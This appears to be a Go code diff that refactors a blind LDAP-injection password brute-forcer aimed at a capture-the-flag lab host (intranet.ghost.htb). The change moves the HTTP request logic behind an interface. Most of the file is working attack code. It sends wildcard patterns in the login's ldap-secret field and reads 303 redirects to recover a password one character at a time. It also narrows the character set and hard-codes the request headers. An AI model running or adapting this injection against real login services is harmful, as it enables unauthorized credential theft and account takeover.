@@ -7,48 +7,25 @@ import (
 	"strings"
 )
 
+type Injector interface {
+	Do(password string) (bool, error)
+}
+
 type LdapInjector struct {
-	Url      string
-	Username string
-	Charset  string
+	Client  Injector
+	Charset string
 }
 
-func NewLdapInjector(url, username string) *LdapInjector {
+func NewLdapInjector(client Injector) *LdapInjector {
 	return &LdapInjector{
-		Url:      url,
-		Username: username,
-		Charset:  CreateCharSet(),
+		Client:  client,
+		Charset: CreateCharSet(),
 	}
-}
-
-func (li *LdapInjector) TestPassword(password string) (bool, error) {
-	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, li.Username, password)
-	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
-	if err != nil {
-		return false, err
-	}
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("Next-Action", "c47eb076ccac91d6f828b671795550fd5925940") // hard coded for ghost box
-
-	// golang auto follows redirects, disabling
-	client := &http.Client{
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-	}
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return false, err
-	}
-	defer resp.Body.Close()
-
-	return resp.StatusCode == http.StatusSeeOther, nil
 }
 
 func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
 	for _, c := range li.Charset {
-		if ok, err := li.TestPassword(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
+		if ok, err := li.Client.Do(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
 			return "", err
 		} else if ok {
 			return string(c), nil
@@ -65,7 +42,7 @@ func (li *LdapInjector) BruteForce() (string, error) {
 			return "", err
 		}
 		if c == "" {
-			if ok, err := li.TestPassword(result); err != nil {
+			if ok, err := li.Client.Do(result); err != nil {
 				return "", err
 			} else if ok {
 				return "", fmt.Errorf("Partial password found: %s", result)
@@ -94,7 +71,7 @@ func CreateCharSet() string {
 func (li *LdapInjector) PruneCharset() error {
 	var newCharset string
 	for _, c := range li.Charset {
-		if ok, err := li.TestPassword(fmt.Sprintf("*%s*", string(c))); err != nil {
+		if ok, err := li.Client.Do(fmt.Sprintf("*%s*", string(c))); err != nil {
 			return err
 		} else if ok {
 			newCharset += string(c)
@@ -105,8 +82,13 @@ func (li *LdapInjector) PruneCharset() error {
 }
 
 func main() {
-	c := NewLdapInjector("http://intranet.ghost.htb:8008/login", "gitea_temp_principal")
-	c.PruneCharset()
+	httpClient := NewNetHttpBruteImpl("POST", "http://intranet.ghost.htb:8008/login", "gitea_temp_principal", 303,
+		map[string]string{
+			"Content-Type": "application/x-www-form-urlencoded",
+			"Next-Action":  "c47eb076ccac91d6f828b671795550fd5925940", // hard coded for ghost box
+		},
+	)
+	c := NewLdapInjector(httpClient)
 
 	pw, err := c.BruteForce()
 	if err != nil {
